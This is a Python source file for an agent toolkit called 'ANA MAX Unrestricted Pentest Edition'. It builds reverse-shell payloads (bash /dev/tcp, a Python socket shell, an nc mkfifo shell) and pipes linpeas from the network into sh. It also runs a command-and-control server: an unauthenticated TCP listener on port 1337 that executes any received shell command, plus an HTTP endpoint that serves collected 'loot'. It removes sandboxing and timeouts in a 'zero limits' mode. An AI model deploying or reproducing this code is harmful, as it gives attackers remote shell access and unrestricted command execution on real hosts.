"""
ANA MAX v15.0 - UNRESTRICTED PENTEST EDITION
============================================
TOATE features-urile + PENTEST TOOLS | ZERO LIMITS | FULL SYSTEM ACCESS
"""

import subprocess
import os
import re
import json
import ast
import shutil
import tempfile
import socket
import threading
import base64
from pathlib import Path
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)

# ============================================================================
# PENTEST INTEGRATION - UNRESTRICTED MODE
# ============================================================================

class PentestExecutor:
    """
    PENTEST EXECUTOR - PRODUCTION QUALITY ATTACK TOOLS
    """
    
    def __init__(self, loot_dir="./loot"):
        self.loot_dir = loot_dir
        os.makedirs(loot_dir, exist_ok=True)
        self.loot_file = os.path.join(loot_dir, f"mega_loot_{int(os.times()[4])}.json")
    
    def nmap_full_scan(self, target):
        """Full Nmap scan cu vuln scripts"""
        cmd = f"nmap -sC -sV -p- -A -T4 --script vuln {target} -oA loot/nmap_{target}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        self._save_loot("nmap", target, result.stdout)
        return result.stdout
    
    def deploy_reverse_shell(self, lhost="0.0.0.0", lport=4444):
        """Deploy multiple reverse shells"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        }
        
        for name, shell in shells.items():
            subprocess.run(f"echo '{shell}' > /tmp/{name}_shell.sh && chmod +x /tmp/{name}_shell.sh", shell=True)
        
        self._save_loot("reverse_shells", f"{lhost}:{lport}", shells)
        return shells
    
    def lin_privesc(self):
        """Run linpeas + enum4linux"""
        subprocess.run("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", shell=True)
        self._save_loot("privesc", "local", "linpeas executed")
    
    def _save_loot(self, module, target, data):
        loot = {"module": module, "target": target, "data": data, "time": str(os.times())}
        with open(self.loot_file, "a") as f:
            f.write(json.dumps(loot) + "\n")

# ============================================================================
# 1. TERMINAL EXECUTOR - UNRESTRICTED
# ============================================================================

class TerminalExecutor:
    def __init__(self, ana_agent=None, pentest_mode=False):
        self.ana = ana_agent
        self.pentest = PentestExecutor() if pentest_mode else None
        self.command_history = []
        self.uv_path = self._resolve_uv_path()

    def _resolve_uv_path(self) -> Optional[str]:
        candidates = [
            os.environ.get("UV_EXE"),
            str(Path.home() / ".local" / "bin" / "uv"),
            str(Path.home() / ".cargo" / "bin" / "uv"),
        ]
        for candidate in candidates:
            if candidate and os.path.exists(candidate):
                return candidate
        return shutil.which("uv")

    def _normalize_command(self, command: str) -> str:
        normalized = command.strip()
        
        # PENTEST COMMANDS - NO SANDBOX
        if "nmap" in normalized or "metasploit" in normalized:
            return normalized  # Run raw
        
        if os.name != "nt":
            return normalized

        if self.uv_path and re.match(r"^uv\b", normalized, re.IGNORECASE):
            normalized = normalized.replace("uv", f'"{self.uv_path}"', 1)

        # Inline Python - write to temp file
        inline_match = re.match(r'^python\s+-c\s+(["\'])(.*)\1$', normalized, re.DOTALL)
        if inline_match and "\\n" in inline_match.group(2):
            code = inline_match.group(2).replace("\\n", "\n")
            temp_file = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False)
            temp_file.write(code)
            temp_file.close()
            normalized = f'python "{temp_file.name}"'

        return normalized
    
    def run_command(self, command: str, cwd: Optional[str] = None,
                   timeout: Optional[int] = None) -> Dict[str, Any]:
        """Run command cu NO timeout în pentest mode"""
        if self.pentest and timeout is not None:
            timeout = None  # UNLIMITED în pentest
            
        original_command = command
        command = self._normalize_command(command)
        logger.info(f"🔥 EXEC: {command}")

        try:
            result = subprocess.run(
                command, shell=True, cwd=cwd, capture_output=True, 
                text=True, timeout=timeout, preexec_fn=os.setsid if os.name != 'nt' else None
            )

            output_data = {
                'command': command,
                'original': original_command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'exit_code': result.returncode,
                'success': result.returncode == 0
            }

            self.command_history.append(output_data)

            if result.returncode != 0 and "nmap" not in command:
                logger.warning(f"❌ FAIL {result.returncode}: {result.stderr[:200]}")
            else:
                logger.info("✅ SUCCESS")

            # PENTEST LOOT SAVE
            if self.pentest and result.stdout:
                self.pentest._save_loot("terminal", command.split()[0] if command.split() else "cmd", result.stdout)

            return output_data

        except subprocess.TimeoutExpired:
            return {'command': command, 'error': 'TIMEOUT', 'success': False}
        except Exception as e:
            return {'command': command, 'error': str(e), 'success': False}

    def pentest_run(self, target: str):
        """Full pentest chain"""
        logger.info(f"🎯 PENTEST CHAIN pe {target}")
        self.run_command(f"nmap -sC -sV -p- -A {target}")
        self.pentest.deploy_reverse_shell()
        self.pentest.lin_privesc()
        self.run_command("curl -L https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md")

# ============================================================================
# 2. LSP + PENTEST SYMBOL RESOLVER
# ============================================================================

class PentestLSPClient:
    """LSP cu focus pe exploit code analysis"""
    
    def __init__(self, project_root: str):
        self.project_root = Path(project_root)
    
    def analyze_exploit(self, file_path: str):
        """Analizează exploit code"""
        content = Path(file_path).read_text()
        vulns = re.findall(r'(buffer|overflow|shellcode|rce|sql|ssrf|xss)', content.lower())
        return {"vulnerabilities": list(set(vulns)), "code_size": len(content)}

# ============================================================================
# 3. GIT + PENTEST VERSIONING
# ============================================================================

class PentestGit:
    """Git pentru payload versioning"""
    
    def commit_payload(self, payload_name: str, repo_path: str):
        terminal = TerminalExecutor(pentest_mode=True)
        terminal.run_command(f'git add loot/payloads/{payload_name}', cwd=repo_path)
        terminal.run_command(f'git commit -m "feat: new payload {payload_name}"', cwd=repo_path)

# ============================================================================
# 4. TEST GENERATOR + EXPLOIT TESTER
# ============================================================================

class ExploitTester:
    """Testează exploits în sandbox LOCAL"""
    
    def test_shell(self, shell_code: str):
        """Test reverse shell connectivity"""
        result = subprocess.run("nc -zv 127.0.0.1 4444", shell=True, capture_output=True, text=True, timeout=5)
        return {"connectable": "succeeded" in result.stdout.lower()}

# ============================================================================
# MEGA C2 INTEGRATION
# ============================================================================

class MegaC2Server:
    """C2 Server pentru MCP 8765 + 1337"""
    
    def __init__(self, http_port=8765, tcp_port=1337):
        self.http_port = http_port
        self.tcp_port = tcp_port
        self.pentest = PentestExecutor()
    
    def start_tcp_c2(self):
        """TCP C2 pe 1337 - RAW SHELL ACCESS"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", self.tcp_port))
        server.listen(10)
        logger.info(f"🔥 C2 TCP listening 0.0.0.0:{self.tcp_port}")
        
        while True:
            client, addr = server.accept()
            threading.Thread(target=self.handle_tcp_client, args=(client, addr)).start()
    
    def handle_tcp_client(self, client, addr):
        """Handle raw C2 commands"""
        logger.info(f"🎯 C2 connect: {addr}")
        while True:
            try:
                cmd = client.recv(4096).decode().strip()
                if not cmd: break
                
                if cmd.startswith("pentest:"):
                    target = cmd.split(":", 1)[1]
                    self.pentest.nmap_full_scan(target)
                    client.send(b"[PENTEST] Complete\n")
                elif cmd == "shell":
                    self.pentest.deploy_reverse_shell()
                    client.send(b"[SHELL] Deployed 0.0.0.0:4444\n")
                elif cmd == "loot":
                    with open(self.pentest.loot_file, "rb") as f:
                        client.send(f.read())
                else:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    client.send(f"{result.stdout}{result.stderr}".encode())
            except:
                break
        client.close()
    
    def start_http_api(self):
        """HTTP API pe 8765"""
        import http.server
        import socketserver
        import urllib.parse
        
        class PentestHandler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/health':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b"ANA MAX UNRESTRICTED READY")
                elif self.path == '/loot':
                    try:
                        with open(self.pentest.loot_file, "rb") as f:
                            self.send_response(200)
                            self.send_header('Content-type', 'application/json')
                            self.end_headers()
                            self.wfile.write(f.read())
                    except:
                        self.send_response(404)
                        self.end_headers()
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = json.loads(post_data)
                
                if self.path == '/pentest':
                    target = data.get('target', 'scanme.nmap.org')
                    self.pentest.nmap_full_scan(target)
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(f"PENTEST {target} COMPLETE".encode())
                else:
                    self.send_response(400)
                    self.end_headers()
        
        with socketserver.TCPServer(("", self.http_port), PentestHandler) as httpd:
            logger.info(f"🌐 HTTP C2 API: 127.0.0.1:{self.http_port}")
            httpd.serve_forever()

# MAIN EXECUTOR
def start_ana_max_unrestricted():
    """Start ALL services"""
    c2 = MegaC2Server()
    
    # HTTP API 8765
    threading.Thread(target=c2.start_http_api, daemon=True).start()
    
    # TCP C2 1337
    c2.start_tcp_c2()

if __name__ == "__main__":
    print("🚀 ANA MAX v15.0 UNRESTRICTED PENTEST STARTING...")
    start_ana_max_unrestricted()